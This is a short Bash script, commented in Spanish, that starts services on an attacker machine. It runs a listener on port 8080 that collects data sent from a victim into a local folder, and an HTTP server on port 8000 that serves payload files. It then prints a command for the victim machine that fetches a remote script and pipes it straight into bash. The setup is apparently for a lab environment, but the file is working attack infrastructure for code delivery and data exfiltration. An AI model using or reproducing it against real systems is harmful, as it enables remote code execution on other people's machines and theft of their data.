#!/bin/bash
# Script para iniciar servicios del atacante
# Uso: ./start_attacker.sh

echo "🎯 Iniciando servicios de la máquina atacante..."
echo "========================================"

# Verificar dependencias
command -v python3 >/dev/null 2>&1 || { echo "❌ python3 no está instalado"; exit 1; }

# Crear directorio para datos recibidos
mkdir -p received_data

echo "📡 Puertos utilizados:"
echo "   - Puerto 8080: Receptor de datos (data_receiver.py)"
echo "   - Puerto 8000: Servidor HTTP para archivos"
echo ""

# Función para manejar Ctrl+C
cleanup() {
    echo -e "\n🔴 Deteniendo servicios..."
    jobs -p | xargs -r kill
    exit 0
}

trap cleanup SIGINT

# Iniciar receptor de datos en background
echo "🚀 Iniciando receptor de datos en puerto 8080..."
python3 data_receiver.py --port 8080 &
RECEIVER_PID=$!

# Esperar un momento
sleep 2

# Iniciar servidor HTTP en background
echo "📂 Iniciando servidor HTTP en puerto 8000..."
python3 -m http.server 8000 &
HTTP_PID=$!

echo ""
echo "✅ Servicios iniciados correctamente!"
echo "📊 Receptor de datos: http://localhost:8080"
echo "📁 Servidor de archivos: http://localhost:8000"
echo ""
echo "💡 Desde la máquina víctima, ejecuta:"
echo "   curl -s http://10.0.2.15:8000/auto_setup.sh | bash"
echo ""
echo "⚠️  Presiona Ctrl+C para detener ambos servicios"

# Esperar a que terminen los procesos
wait
